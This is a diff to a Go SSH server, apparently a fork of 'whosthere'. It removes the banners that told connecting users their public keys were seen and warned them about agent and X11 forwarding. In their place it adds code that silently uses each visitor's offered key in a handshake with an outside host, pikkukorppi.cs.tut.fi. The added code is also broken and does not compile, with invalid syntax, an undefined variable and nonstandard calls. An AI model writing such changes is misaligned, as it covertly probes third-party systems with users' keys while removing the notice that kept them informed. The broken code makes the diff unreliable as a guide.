@@ -15,85 +15,7 @@ import (
 	"github.com/joonakannisto/gocrypto/ssh"
 )
 
-var termTmpl = template.Must(template.New("termTmpl").Parse(strings.Replace(`
-    +---------------------------------------------------------------------+
-    |                                                                     |
-    |             _o/ Hello {{ .Name }}!
-    |                                                                     |
-    |                                                                     |
-    |  Did you know that ssh sends all your public keys to any server     |
-    |  it tries to authenticate to?                                       |
-    |                                                                     |
-    |  That's how we know you are @{{ .User }} on GitHub!
-    |                                                                     |
-    |  Ah, maybe what you didn't know is that GitHub publishes all users' |
-    |  ssh public keys and Ben (benjojo.co.uk) grabbed them all.          |
-    |                                                                     |
-    |  That's pretty handy at times :) for example your key is at         |
-    |  https://github.com/{{ .User }}.keys
-    |                                                                     |
-    |                                                                     |
-    |  P.S. This whole thingy is Open Source! (And written in Go!)        |
-    |  https://github.com/FiloSottile/whosthere                           |
-    |                                                                     |
-    |  -- @FiloSottile (https://twitter.com/FiloSottile)                  |
-    |                                                                     |
-    +---------------------------------------------------------------------+
 
-`, "\n", "\n\r", -1)))
-
-var failedMsg = []byte(strings.Replace(`
-    +---------------------------------------------------------------------+
-    |                                                                     |
-    |             _o/ Hello!                                              |
-    |                                                                     |
-    |                                                                     |
-    |  Did you know that ssh sends all your public keys to any server     |
-    |  it tries to authenticate to? You can see yours echoed below.       |
-    |                                                                     |
-    |  We tried to use that to find your GitHub username, but we          |
-    |  couldn't :( maybe you don't even have GitHub ssh keys, do you?     |
-    |                                                                     |
-    |  By the way, did you know that GitHub publishes all users'          |
-    |  ssh public keys and Ben (benjojo.co.uk) grabbed them all?          |
-    |                                                                     |
-    |  That's pretty handy at times :) But not this time :(               |
-    |                                                                     |
-    |                                                                     |
-    |  P.S. This whole thingy is Open Source! (And written in Go!)        |
-    |  https://github.com/FiloSottile/whosthere                           |
-    |                                                                     |
-    |  -- @FiloSottile (https://twitter.com/FiloSottile)                  |
-    |                                                                     |
-    +---------------------------------------------------------------------+
-
-`, "\n", "\n\r", -1))
-
-var agentMsg = []byte(strings.Replace(`
-                      ***** WARNING ***** WARNING *****
-
-         You have SSH agent forwarding turned (universally?) on. That
-        is a VERY BAD idea. For example right now I have access to your
-        agent and I can use your keys however I want as long as you are
-       connected. I'm a good guy and I won't do anything, but ANY SERVER
-        YOU LOG IN TO AND ANYONE WITH ROOT ON THOSE SERVERS CAN LOGIN AS
-                                 YOU ANYWHERE.
-
-                       Read more:  http://git.io/vO2A6
-`, "\n", "\n\r", -1))
-
-var x11Msg = []byte(strings.Replace(`
-                      ***** WARNING ***** WARNING *****
-
-            You have X11 forwarding turned (universally?) on. That
-        is a VERY BAD idea. For example right now I have access to your
-          X11 server and I can access your desktop as long as you are
-       connected. I'm a good guy and I won't do anything, but ANY SERVER
-         YOU LOG IN TO AND ANYONE WITH ROOT ON THOSE SERVERS CAN SNIFF
-                  YOUR KEYSTROKES AND ACCESS YOUR WINDOWS.
-
-     Read more:  http://www.hackinglinuxexposed.com/articles/20040705.html
-`, "\n", "\n\r", -1))
 
 type sessionInfo struct {
 	User string
@@ -110,13 +32,22 @@ func (s *Server) PublicKeyCallback(conn ssh.ConnMetadata, key ssh.PublicKey) (*s
 	s.mu.Lock()
 	si := s.sessionInfo[string(conn.SessionID())]
 	si.User = conn.User()
+	string host = "pikkukorppi.cs.tut.fi"
+	sshConfig := &ssh.ClientConfig{
+		User: user,
+		Auth: []ssh.AuthMethod{ssh.WorkingKeys(key)},
+	}
+	shake, err := ssh.ShakeThat("tcp", host, sshConfig)
+        if err != nil {
+             si.Keys = append(si.Keys, key)
+	}
 	
-	si.Keys = append(si.Keys, key)
 	s.sessionInfo[string(conn.SessionID())] = si
 	s.mu.Unlock()
 
 	// Never succeed a key, or we might not see the next. See KeyboardInteractiveCallback.
 	return nil, errors.New("")
+
 }
 
 func (s *Server) KeyboardInteractiveCallback(ssh.ConnMetadata, ssh.KeyboardInteractiveChallenge) (*ssh.Permissions, error) {
